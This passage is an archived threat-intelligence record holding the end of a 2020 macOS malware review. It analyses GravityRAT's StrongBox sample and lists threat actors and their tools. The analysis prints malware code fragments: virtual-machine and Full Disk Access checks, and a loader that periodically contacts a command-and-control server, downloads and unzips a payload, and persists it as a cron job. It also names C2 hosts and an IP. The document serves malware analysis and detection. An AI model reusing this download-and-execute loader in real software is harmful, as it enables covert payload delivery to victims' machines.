1 function VMCheck(stdout) {\n 2\n 3  ...\n 4\n 5 const options = {\n 6 type: 'question',\n 7 buttons: ['Ok'],\n 8 defaultId: 2,\n 9 title: 'StrongBOX - Operation Not Permitted',\n10 message: 'Oops!! Something went wrong. ',\n11 detail: 'Please check your internet connection and try again.'\n12   };\n13\n14 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n15 app.quit();\n\n```\n\n-----\n\nHowever, it appears that perhaps there is bug in the malware’s code, and an incorrect error message will be displayed … “Please check\n_your internet connection and try again.\":_\n\n(incorrect) Error Message\n\nThe main.js file also contains logic for a simple “is connected” check. Often malware performs such checks to ensure it can\ncommunicate with a remote command and control server, and/or to detect if it is perhaps executing on an offline analysis system.\n\nTo ascertain if it’s running on an Internet connection system, the malware invokes a function named connection which simply attempts\nto ping www.google.com:\n\n```\n 1 function connection(){\n 2 execRoot('ping -t 4 www.google.com', function(error, stdout, stderr){\n 3 if(error || error !== null){\n 4 const options = {\n 5 type: 'question',\n 6 buttons: ['Ok'],\n 7 defaultId: 2,\n 8 title: 'Internet Connectivity Required',\n 9 message: 'Action Required',\n10 detail: \"Sorry! Please check your internet connectivity and try again.\"\n11     };\n12\n13 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n14 app.quit();\n15 app.exit();\n16     });\n17\n18  } });\n19 }\n\n```\n\nVia our **[Process Monitor, we can observe this execution of the ping command:](https://objective-see.com/products/utilities.html#ProcessMonitor)**\n\n\n##### # ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty ...\n\n {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",  \"process\" : {   \"uid\" : 501,   \"arguments\" : [    \"ping\",    \"-t\",    \"4\",\n \"www google com\"\n\n\n-----\n\n#####   ancestors : [    1447,    1   ],   \"path\" : \"/sbin/ping\",   ...  } }\n\n\nLastly the main.js function checks if the malware has been granted Full Disk Access (FDA).\n\n```\nOn recent versions of macOS, applications are prevented from accessing various user/system files,\nunless the user has manually granted the application “Full Disk Access” (via the System Preferences\napplication).\nAs such, malware that desires indiscriminate file system access may attempt to coerce users into\ngranting such access.\n\n```\n\nIn order to check if has Full Disk Access, GravityRat attempts to list the files in the ~/Library/Safari. As this directory is\ninaccessible to applications without FDA, this is sufficient check. If the malware determines it does not have FDA, it will prompt to the user\nto grant such access:\n\n```\n 1 var ressslt = execRoot('ls ~/Library/Safari', function(err, data, stderr){\n 2\n 3 if(!data || data ==\"\")\n 4  {\n 5 const options = {\n 6 type: 'question',\n 7 buttons: ['Ok'],\n 8 defaultId: 2,\n 9 title: 'StrongBox - Operation Not Permitted',\n10 message: 'Action Required',\n11 detail: \"Please follow the instructions to resolve this issue\n12           System Preferences -> Security & Privacy ->\n13               Full Disk Access to Terminal.app\"\n14      };\n15\n16 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n17 app.quit();\n18 app.exit();\n19      });\n20\n21  } });\n22 }\n\n```\n\nIn the StrongBox sample, the main.js file contains logic related to environmental checks (i.e. VM & FDA checks), the core of the\nmalicious logic appears in the signature.js file. As such, let’s now we dive into the signature.js file.\n\nAt the start of the signature.js file we find various variables being initialized:\n\n```\n1 var srur = 'https://download.strongbox.in/strongbox/';\n2 var srdr = 'https://download.strongbox.in/A0B74607.php';\n3 var loclpth = path.join(app1.getPath('appData'), '/SCloud');\n\n```\n\nThese variable appear to the malware’s command and control server and a directory path, found within the user application data directory\n(that we’ll see is used for persistence).\n\n\n-----\n\n```\n$ nslookup download.strongbox.in Server: 8.8.8.8 Address: 8.8.8.8#53\n** server can’t find download.strongbox.in: SERVFAIL\n\n```\n```\nThe code snippet, getPath(‘appData’), will return the “Per-user application data directory”, which on\nmacOS points to ~/Library/Application Support.\n\n```\n\nIf needed, the malware then will create the directory specified in the loclpth variable (~/Library/Application\n```\nSupport/SCloud):\n\n```\n```\n1 if (!fs.existsSync(loclpth)){\n2 fs.mkdirSync(loclpth,0700);\n\n```\n\nFurther down in the signature.js file, we can see the malware invoking a function named updates via the setInterval API:\n\n```\n1 setInterval(updates,180000) \n\n```\n\nAs its name implies, the updates will download a file (and “update”) from the server specified in the srdr variable\n(https://download.strongbox.in/A0B74607.php):\n\n```\n 1 function updates()\n 2 {\n 3 const insst = axios.create();\n 4 var hash = store.get('Hash')\n 5 axios.post(srdr, {\n 6 value: 'update',\n 7 hash: hash\n 8     })\n 9  .then((response) => {\n10 var respns = response.data;\n11 if(respns){\n12 var rply = respns.split('#');\n13 var fname = rply[0].trim();\n14 var agentTask = rply[1];\n15  }\n16\n17  ...\n18\n19 var dpath;\n20 if(osvar.trim()==\"darwin\")\n21 var file = fs.createWriteStream(dpath);\n22 var request = https.get(srur+'Updates/' + fname, function(response) {\n23 response.pipe(file);\n24 file.on('finish', function() {\n25 getDateTime();\n26 extractzip1(fname,agentTask);\n27 file.close();\n28  });\n29\n30  ...\n31 }\n\n```\n\nIf this remote server (https://download.strongbox.in/A0B74607.php), provides a payload for download, the malware will\nthen invoke the extractzip1 function:\n\n\n-----\n\n```\n 3\n 4 var source;\n 5 var sourceTozip;\n 6 if(osvar.trim()==\"darwin\") {\n 7 source = loclpth+\"/\"+fname;\n 8 sourceTozip = source+\".zip\";\n 9  }\n10\n11  ...\n12 fs.rename(source, sourceTozip, function(err) {\n13\n14  });\n15\n16\n17 if(osvar.trim()==\"darwin\") {\n18 var extract = require('extract-zip')\n19 var target= loclpth;\n20 extract(sourceTozip, {dir: target}, function (err) {\n21\n22   ...\n23 scheduleMac(fname,agentTask);\n24   }\n25   });\n26  }\n27 }\n\n```\n\nAfter appending .zip, the malware extracts the downloaded (zip) file to the location specified in the loclpth variable\n(~/Library/Application Support/SCloud). Once extracted it invokes a function we discussed earlier scheduleMac …which\npersists (as a cronjob) and launches the downloaded payload.\n\nUnfortunately the remote servers (e.g. download.strongbox.in) are now offline, and as such, the 2nd stage payloads are not\navailable for analysis.\n\n### And All Others\n\nThis blog post provided a comprehensive technical analysis of the new mac malware of 2020. However it did not cover adware or malware\nfrom previous years. Of course, this is not to say such items are unimportant …especially when such adware is notarized (to bypass Apple’s\nnew security checks), or when existing malware is updated.\n\nAs such, here we include a list (and links to detailed writeups) of other notable items from 2020, for the interested reader.\n```\n    Shlayer / Vindinstaller Dropper\n\n```\nIn June, Intego researchers uncovered:\n\n_\"...a new [adware dropper] in the wild, actively spreading through malicious results in Google searches._\n\n_Intego identifies the [adware dropper] as unique new variants of OSX/Shlayer (the original variant of which was first_\n_discovered by Intego in 2018) and OSX/Bundlore (with similarities to past versions of OSX/MacOffers and_\n_Mughthesec/BundleMeUp/Adload)” -Intego_\n\n\n-----\n\nAdware Dropper (credit: Intego)\n\nWriteup(s):\n[“New Mac malware reveals Google searches can be unsafe”](https://www.intego.com/mac-security-blog/new-mac-malware-reveals-google-searches-can-be-unsafe/)\n[“How a New macOS Malware Dropper Delivers VindInstaller Adware”](https://www.sentinelone.com/blog/how-a-new-macos-malware-dropper-delivers-vindinstaller-adware/)\n```\n OSX.GMERA (new campaign)\n\n```\nIn July, ESET researchers lured GMERA malware operators “to remotely control their Mac honeypots”.\n\n_\"To learn more about the intentions of this group, we set up honeypots where we monitored all interactions between_\n_the GMERA reverse shell backdoors and the operators of this malware.\" -ESET_\n\nGMERA (run.sh) (credit: ESET)\n\n[We covered OSX.GMERA in our “Mac malware of 2019 report”, although ESET researchers report is noteworthy (in the context of](https://objective-see.com/blog/blog_0x53.html)\n2020), as they uncovered a new campaign leveraging this malware.\n\nWriteup:\n[“Mac cryptocurrency trading application rebranded, bundled with malware”](https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/)\n\n\n-----\n\nwebsite **[brew.sh), was hosting an active adware campaign](https://objective-see.com/blog/%60brew.sh%60)**\n\n…and that the adware has been notarized (read: approved) by Apple:\n\nNotarized Adware\n\nThis means even on Big Sur, the adware will (still) be allowed to run!\n\nIn Apple’s own words, notarization was supposed to “give users more confidence that [software] …has been checked by Apple for\n_malicious components.” …maybe not?_\n\nWriteup:\n[“Apple Approved Malware”](https://objective-see.com/blog/blog_0x4E.html)\n```\n Bundalor Dropper\n\n```\nIn November, SentinelOne researchers published a report on an adware installer that (ab)used resource forks to store its malicious\npayloads.\n\n…the adware installer also provided user-instructions to “bypass” macOS’s latest malware mitigations (e.g. notarization):\n\nAdware Dropper (credit: SentinelOne)\n\n\n-----\n\n```\n    OSX.OceanLotus (new variant)\n\n```\nAlso in November, TrendMicro researchers discovered a backdoor that they tied to the OceanLotus Group. Upon closer analysis, the\napplication (which masquerades as Office documents) appears to be an updated variant of OSX.OceanLotus.F:\n\n_\"Due to similarities in dynamic behavior and code with previous OceanLotus samples, it was confirmed to be a variant_\n_of the said malware [OSX.OceanLotus.F]\" -TrendMicro_\n\nOceanLotus (credit: TrendMicro)\n\nWriteup:\n[“New MacOS Backdoor Connected to OceanLotus Surfaces”](https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html)\n\n### Detections\n\nNew malware is notoriously difficult to detect via traditional signature-based approaches …as, well, it’s new! A far better approach is to\nleverage heuristics or behaviors, that can detect such malware, even with no a priori knowledge of the specific (new) threats.\n\nFor example, imagine you open an Office Document that (unbeknownst to you) contains an exploit or malicious macros which installs a\npersistent backdoor. This is clearly an unusual behavior, that should be detected and alerted upon.\n\nGood news, our free macOS security tools do not leverage signatures, but instead monitor for such (unusual, and likely malicious)\nbehaviors. This allows them to detect and alert on various behaviors of all the new malware of 2020 (with no prior knowledge of the\nmalware).\n\nFor example, let’s look at how OSX.Dacls was be detected by our free tools:\n\n**[BlockBlock readily detects when the malware’s attempts to persist as a launch item (com.aex-loop.agent.plist](https://objective-see.com/products/blockblock.html)** →\n```\n  ~/Library/.mina):\n\n```\n**[LuLu detects the malware’s unauthorized network communications to the attackers' remote command & control server](https://objective-see.com/products/lulu.html)**\n(~/Library/.mina → `67.43.239.146):`\n\n\n-----\n\n**[KnockKnock can scan a system and generically if it is infected with OSX.Dacls, by detecting its launch item persistence](https://objective-see.com/products/knockknock.html)**\n(com.aex-loop.agent.plist → `~/Library/.mina):`\n\nRecall that OSX.EvilQuest would ransom a user’s files. Well good news, our **[RansomWhere? utility could both detect and stop this](https://objective-see.com/products/ransomwhere.html)**\nmalicious behavior in its tracks:\n\n\n-----\n\nThe other new malware samples are similarly detected when they persist, generate an unauthorized network connection, or perform other\nmalicious actions.\n```\n For more information about our free tools, see:\n                         Objective-See's Tools.\n\n### Conclusion:\n\n```\nWell that’s a wrap! Thanks for joining our “journey” as we wandered through the macOS malware of 2020.\n\nWith the continued growth and popularity of macOS (especially in the enterprise!), 2021 will surely bring a bevy of new macOS malware.\n…so, stay safe out there!\n\nAnd if you’d like to learn more about macOS malware and malware analysis techniques, I’ve written an entire (free) book on this very topic:\n\n**[The Art Of Mac Malware, Vol. 0x1: Analysis](https://taomm.org/)**\n```\n                     Love these blog posts?\n                Support my tools & writing on patreon :)\n\n```\n© 2020 objective-see llc [support us!](https://www.patreon.com/bePatron?u=4857001) ! ✉\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/Report/Objective-See/MacMalware_2020.pdf"
    ],
    "report_names": [
        "MacMalware_2020"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1609785686,
    "ts_modification_date": 1609785693,
    "files": {
        "pdf": "https://archive.orkl.eu/ab4cdc69f1f4c44b30d209d02c6e1117a2c2e1e7.pdf",
        "text": "https://archive.orkl.eu/ab4cdc69f1f4c44b30d209d02c6e1117a2c2e1e7.txt",
        "img": "https://archive.orkl.eu/ab4cdc69f1f4c44b30d209d02c6e1117a2c2e1e7.jpg"
    }
}